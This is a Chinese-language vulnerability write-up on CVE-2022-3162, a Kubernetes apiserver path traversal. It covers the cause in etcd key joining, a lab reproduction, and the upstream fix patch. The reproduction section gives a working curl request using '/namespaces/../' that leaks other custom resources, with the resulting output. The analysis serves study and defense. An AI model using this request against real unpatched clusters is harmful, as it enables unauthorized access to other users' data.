# 漏洞分析

## 一、漏洞基本信息

| Item                        | Details                                          | Note                                        |
|-----------------------------|--------------------------------------------------|---------------------------------------------|
| Project                     | Kubernetes                                       |                                             |
| CVE-ID                      | CVE-2022-3162                                    |                                             |
| Vuln's Author               | Richard Turnbull                                 | NCC Group                                   |
| CVSS                        | 6.5 CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |                                             |
| Exploits                    |                                                  |                                             |
| Affect Version              | <= v1.25.3, <= v1.24.7, <= v1.23.13, <= 1.22.15  |                                             |
| Fix Version                 | v1.25.4, v1.24.8, v1.23.14, V1.22.16             |                                             |
| Original Report             |                                                  |                                             |
| Fix Commit                  | [commit](https://github.com/kubernetes/kubernetes/commits/f1693a02c46f79f8c90a4ef17c4a750034f21484)  |   |
| Introduce Commit            | [commit](https://github.com/kubernetes/kubernetes/commit/00ddf0671d91a9ad6e4316e70af07c38cefb9d35)  |   |
| Publish Date                | 2022-11-04                                       |                                             |
| Introduce Date              | 2016-05-31                                       |                                             |


## 二、组件简介
`kube-apiserver`为kubernetes核心组件，提供对资源的增删改查及鉴权等功能，所有对资源的访问请求都要经过`kube-apiserver`

## 三、漏洞详情

### 1. 介绍
在kubernetes中，对资源的访问请求的格式与存储在`etcd`中的键值格式不同，在请求URL中是先`namespace`后`resource type`，而`etcd`中的键值格式是先`resource type`后`namespace`，如访问default命名空间下的my-pod，URL请求路径为`/api/v1/namespaces/default/pods/my-pod`，其对应的`etcd`中的键值为`/registry/pods/default/my-pod`。这也就导致了在`kube-apiserver`处用于鉴权的URL和最终从`etcd`中取的键值可能不同，从而产生越权的问题。在`NCC Group`对`kubernetes 1.24`进行审计时，发现了一个路径穿越的问题。假设用户有`Cluster`范围的`List Pods`的权限，当用户请求`/api/v1/namespaces/../pods`时，`kube-apiserver`会对`/api/v1/pods`进行鉴权，由于用户有该权限，故可通过鉴权。但是，它所对应的`etcd`的键值为`/registry/pods/..`即`/registry`，那么理论上用户就可以列出`/registry`下面的所有对象，由于`kube-apiserver`本身的缘故（返回`<a href="/api/v1/pods">Moved Permanently</a>`）该利用无法成功，但在CRD的情况下则可以成功利用

### 2. 影响
如果存在以下情况，则会导致越权访问CRD资源
- 有多个CustomResourceDefinitions共享一个API Group
- 用户具备其中一个custom resource的`cluster-wide`list或watch的权限
- 该用户则可越权访问API Group下面其他的custom resource

## 四、防御
更新到修复版本

## 五、漏洞复现

### 1. 复现环境

- 创建包含漏洞版本的集群
```shell
kind create cluster --name cve-2022-3162 --image=kindest/node:v1.23.13
```

### 2. 复现过程

- 创建API Group为`example.com`的两个类型的CRD，分别为`typeone`和`typetwo`
```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: typeones.example.com
spec:
  group: example.com
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          spec:
            type: object
            properties:
              field1:
                type: string
  scope: Namespaced
  names:
    plural: typeones
    singular: typeone
    kind: TypeOne
---
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: typetwos.example.com
spec:
  group: example.com
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          spec:
            type: object
            properties:
              field2:
                type: string
  scope: Namespaced
  names:
    plural: typetwos
    singular: typetwo
    kind: TypeTwo
```

- 在每个类型下面创建各一个资源，分别为`example-typeone`和`example-typetwo`
```yaml
apiVersion: "example.com/v1"
kind: TypeOne
metadata:
  name: example-typeone
  namespace: default
spec:
  field1: value1
---
apiVersion: "example.com/v1"
kind: TypeTwo
metadata:
  name: example-typetwo
  namespace: default
spec:
  field2: value2
```

- 创建服务账号`poc`
```
kubectl create sa poc
```

- 授予`poc`集群范围的查看`typeone`资源的权限
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: typeone-reader
rules:
- apiGroups: ["example.com"]
  resources: ["typeones"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: typeone-reader-binding
subjects:
- kind: ServiceAccount 
  name: poc
  namespace: default
roleRef:
  kind: ClusterRole
  name: typeone-reader
  apiGroup: rbac.authorization.k8s.io
```

- 测试`poc`可以访问`typeone`而不能访问`typetwo`
```
curl -kv -H "Authorization: Bearer $token" --path-as-is https://127.0.0.1:40345/apis/example.com/v1/typeones
curl -kv -H "Authorization: Bearer $token" --path-as-is https://127.0.0.1:40345/apis/example.com/v1/typetwos
```

- 构造路径穿越，越权访问`example.com`下的所有资源
```
curl -sk -H "Authorization: Bearer $token" --path-as-is https://127.0.0.1:40345/apis/example.com/v1/namespaces/../typeones
{
  "apiVersion": "example.com/v1",
  "items": [
    {
      "apiVersion": "example.com/v1",
      "kind": "TypeOne",
      "metadata": {
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"example.com/v1\",\"kind\":\"TypeOne\",\"metadata\":{\"annotations\":{},\"name\":\"example-typeone\",\"namespace\":\"default\"},\"spec\":{\"field1\":\"value1\"}}\n"
        },
        "creationTimestamp": "2023-09-25T08:09:11Z",
        "generation": 1,
        "managedFields": [
          {
            "apiVersion": "example.com/v1",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                ".": {},
                "f:field1": {}
              }
            },
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "time": "2023-09-25T08:09:11Z"
          }
        ],
        "name": "example-typeone",
        "namespace": "default",
        "resourceVersion": "4097",
        "uid": "045537bc-fac8-4e18-90ea-a9fcbc18d758"
      },
      "spec": {
        "field1": "value1"
      }
    },
    {
      "apiVersion": "example.com/v1",
      "kind": "TypeTwo",
      "metadata": {
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"example.com/v1\",\"kind\":\"TypeTwo\",\"metadata\":{\"annotations\":{},\"name\":\"example-typetwo\",\"namespace\":\"default\"},\"spec\":{\"field2\":\"value2\"}}\n"
        },
        "creationTimestamp": "2023-09-25T08:09:20Z",
        "generation": 1,
        "managedFields": [
          {
            "apiVersion": "example.com/v1",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                ".": {},
                "f:field2": {}
              }
            },
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "time": "2023-09-25T08:09:20Z"
          }
        ],
        "name": "example-typetwo",
        "namespace": "default",
        "resourceVersion": "4110",
        "uid": "5580b70b-c1b7-4bf1-b1d8-0dcf6c28c780"
      },
      "spec": {
        "field2": "value2"
      }
    }
  ],
  "kind": "TypeOneList",
  "metadata": {
    "continue": "",
    "resourceVersion": "212786"
  }
}
```

## 六、漏洞分析

### 1. 原始特性分析
`kube-apiserver`根据访问请求从`etcd`中取出对应的内容

### 2. 调用链分析

1. staging/src/k8s.io/apiserver/pkg/storage/etcd3/store.go:List
2. ...
3. staging/src/k8s.io/apiserver/pkg/endpoints/filters/authorization.go:WithAuthorization
4. ...

### 3. 漏洞分析
> 参考：https://github.com/kubernetes/kubernetes/issues/119269

函数`List`中调用`path.Join(s.pathPrefix, key)`进行拼接，`s.pathPrefix`为`/registry`，对于请求`/apis/example.com/v1/namespaces/../typeones`，`key`为`/example.com/typeones/..`，拼接之后为`/registry/example.com`，即取出`example.com`下面的所有对象。

staging/src/k8s.io/apiserver/pkg/storage/etcd3/store.go:List
```go
// List implements storage.Interface.List.
func (s *store) List(ctx context.Context, key string, opts storage.ListOptions, listObj runtime.Object) error {
	resourceVersion := opts.ResourceVersion
	match := opts.ResourceVersionMatch
	pred := opts.Predicate
	trace := utiltrace.New("List etcd3",
		utiltrace.Field{"key", key},
		utiltrace.Field{"resourceVersion", resourceVersion},
		utiltrace.Field{"resourceVersionMatch", match},
		utiltrace.Field{"limit", pred.Limit},
		utiltrace.Field{"continue", pred.Continue})
	defer trace.LogIfLong(500 * time.Millisecond)
	listPtr, err := meta.GetItemsPtr(listObj)
	if err != nil {
		return err
	}
	v, err := conversion.EnforcePtr(listPtr)
	if err != nil || v.Kind() != reflect.Slice {
		return fmt.Errorf("need ptr to slice: %v", err)
	}

	if s.pathPrefix != "" {
		key = path.Join(s.pathPrefix, key)
	}
	// We need to make sure the key ended with "/" so that we only get children "directories".
	// e.g. if we have key "/a", "/a/b", "/ab", getting keys with prefix "/a" will return all three,
	// while with prefix "/a/" will return only "/a/b" which is the correct answer.
	if !strings.HasSuffix(key, "/") {
		key += "/"
	}
	keyPrefix := key

	...
	
	for {
		startTime := time.Now()
		getResp, err = s.client.KV.Get(ctx, key, options...)
		...
	}
	...
}
```

## 七、漏洞修复分析

增加了对`..`路径的校验
```patch
--- a/staging/src/k8s.io/apiserver/pkg/storage/etcd3/store.go
+++ b/staging/src/k8s.io/apiserver/pkg/storage/etcd3/store.go

 // List implements storage.Interface.List.
 func (s *store) List(ctx context.Context, key string, opts storage.ListOptions, listObj runtime.Object) error {
+	preparedKey, err := s.prepareKey(key)
+	if err != nil {
+		return err
+	}
+
 	resourceVersion := opts.ResourceVersion
 	match := opts.ResourceVersionMatch
 	pred := opts.Predicate
@@ -624,16 +654,13 @@ func (s *store) List(ctx context.Context, key string, opts storage.ListOptions,
 		return fmt.Errorf("need ptr to slice: %v", err)
 	}
 
-	if s.pathPrefix != "" {
-		key = path.Join(s.pathPrefix, key)
-	}
 	// We need to make sure the key ended with "/" so that we only get children "directories".
 	// e.g. if we have key "/a", "/a/b", "/ab", getting keys with prefix "/a" will return all three,
 	// while with prefix "/a/" will return only "/a/b" which is the correct answer.
-	if !strings.HasSuffix(key, "/") {
-		key += "/"
+	if !strings.HasSuffix(preparedKey, "/") {
+		preparedKey += "/"
 	}
-	keyPrefix := key
+	keyPrefix := preparedKey
 
 	// set the appropriate clientv3 options to filter the returned data set
 	var paging bool
@@ -669,7 +696,7 @@ func (s *store) List(ctx context.Context, key string, opts storage.ListOptions,
 
 		rangeEnd := clientv3.GetPrefixRangeEnd(keyPrefix)
 		options = append(options, clientv3.WithRange(rangeEnd))
-		key = continueKey
+		preparedKey = continueKey
 
 		// If continueRV > 0, the LIST request needs a specific resource version.
 		// continueRV==0 is invalid.
@@ -726,7 +753,7 @@ func (s *store) List(ctx context.Context, key string, opts storage.ListOptions,
 	var getResp *clientv3.GetResponse
 	for {
 		startTime := time.Now()
-		getResp, err = s.client.KV.Get(ctx, key, options...)
+		getResp, err = s.client.KV.Get(ctx, preparedKey, options...)
 		metrics.RecordEtcdRequestLatency("list", getTypeName(listPtr), startTime)
 		if err != nil {
 			return interpretListError(err, len(pred.Continue) > 0, continueKey, keyPrefix)
@@ -779,7 +806,7 @@ func (s *store) List(ctx context.Context, key string, opts storage.ListOptions,
 		if int64(v.Len()) >= pred.Limit {
 			break
 		}
-		key = string(lastKey) + "\x00"
+		preparedKey = string(lastKey) + "\x00"
 		if withRev == 0 {
 			withRev = returnedRV
 			options = append(options, clientv3.WithRev(withRev))

+func (s *store) prepareKey(key string) (string, error) {
+	if key == ".." ||
+		strings.HasPrefix(key, "../") ||
+		strings.HasSuffix(key, "/..") ||
+		strings.Contains(key, "/../") {
+		return "", fmt.Errorf("invalid key: %q", key)
+	}
+	if key == "." ||
+		strings.HasPrefix(key, "./") ||
+		strings.HasSuffix(key, "/.") ||
+		strings.Contains(key, "/./") {
+		return "", fmt.Errorf("invalid key: %q", key)
+	}
+	if key == "" || key == "/" {
+		return "", fmt.Errorf("empty key: %q", key)
+	}
+	// We ensured that pathPrefix ends in '/' in construction, so skip any leading '/' in the key now.
+	startIndex := 0
+	if key[0] == '/' {
+		startIndex = 1
+	}
+	return s.pathPrefix + key[startIndex:], nil
+}
```

## 八、漏洞挖掘方法与过程

## 九、同类问题挖掘方法

### 设计实现层

### Fuzz

### codeql

## 十、时间线

